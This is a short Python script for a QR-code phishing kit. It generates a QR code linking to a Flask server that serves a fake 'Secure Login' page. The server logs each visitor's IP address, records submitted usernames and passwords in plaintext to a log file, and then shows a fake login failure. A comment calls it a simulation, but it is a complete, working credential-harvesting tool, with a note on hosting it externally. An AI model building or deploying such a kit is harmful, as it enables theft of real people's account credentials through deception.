import qrcode
import os
from flask import Flask, request, render_template_string, redirect


# Flask App to simulate phishing
app = Flask(__name__)


# Phishing page template (fake login)
FAKE_LOGIN_PAGE = '''
<!DOCTYPE html>
<html>
<head><title>Secure Login</title></head>
<body>
    <h2>Login to Your Account</h2>
    <form action="/submit" method="POST">
        <label>Username:</label>
        <input type="text" name="username" required><br>
        <label>Password:</label>
        <input type="password" name="password" required><br>
        <input type="submit" value="Login">
    </form>
</body>
</html>
'''

# Log file for tracking QR scans and login attempts
LOG_FILE = "scan_logs.txt"

def log_attempt(data):
    with open(LOG_FILE, "a") as log:
        log.write(data + "\n")


@app.route('/')
def phishing_page():
    log_attempt("QR code scanned: " + request.remote_addr)
    return render_template_string(FAKE_LOGIN_PAGE)


@app.route('/submit', methods=['POST'])
def capture_credentials():
    username = request.form.get('username')
    password = request.form.get('password')
    log_attempt(f"LOGIN ATTEMPT: {username} - {password}")
    return "Login failed. Please try again.", 401


def generate_qr(link, output_file="phishing_qr.png"):
    qr = qrcode.QRCode(
        version=1,
        error_correction=qrcode.constants.ERROR_CORRECT_L,
        box_size=10,
        border=4,
    )
    qr.add_data(link)
    qr.make(fit=True)
    img = qr.make_image(fill_color="black", back_color="white")
    img.save(output_file)
    print(f"QR Code saved as {output_file}")


if __name__ == '__main__':
    # Generate a QR code pointing to the phishing site
    phishing_url = "http://127.0.0.1:5000"  # Change this if hosting externally
    generate_qr(phishing_url)
    print("Starting phishing server...")
    app.run(host='0.0.0.0', port=5000, debug=True)
